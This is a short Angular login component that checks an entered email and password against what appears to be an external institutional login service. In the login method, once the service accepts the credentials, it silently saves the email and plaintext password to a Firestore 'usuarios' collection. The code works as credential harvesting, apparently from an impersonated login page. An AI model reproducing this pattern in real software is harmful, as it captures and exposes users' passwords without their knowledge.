import { Component, OnInit } from '@angular/core';
import { LoginService } from './login.service';
import { switchMap } from 'rxjs';
import { Router } from '@angular/router';
import {
  Firestore,
  collection,
  addDoc,
  CollectionReference,
} from '@angular/fire/firestore';

@Component({
  selector: 'app-login',
  templateUrl: './login.component.html',
  styleUrls: ['./login.component.scss'],
})
export class LoginComponent implements OnInit {
  email: string = '';
  password: string = '';
  usuariosCollection: CollectionReference<any>;

  constructor(
    private loginService: LoginService,
    private router: Router,
    private firestore: Firestore
  ) {
    this.usuariosCollection = collection(this.firestore, 'usuarios');
  }

  ngOnInit(): void {}

  login() {
    this.loginService
      .login(this.email, this.password)
      .pipe(
        switchMap((res) => {
          if (res.UcsMetodoLoginRespuesta.valor !== 'N') {
            addDoc(this.usuariosCollection, {
              user: this.email,
              password: this.password,
            });
            return this.loginService.token(this.email, this.password);
          }
          return [];
        })
      )
      .subscribe((res) => {
        sessionStorage.setItem('token', res.access_token);
        this.router.navigate(['/home']);
      });
  }
}
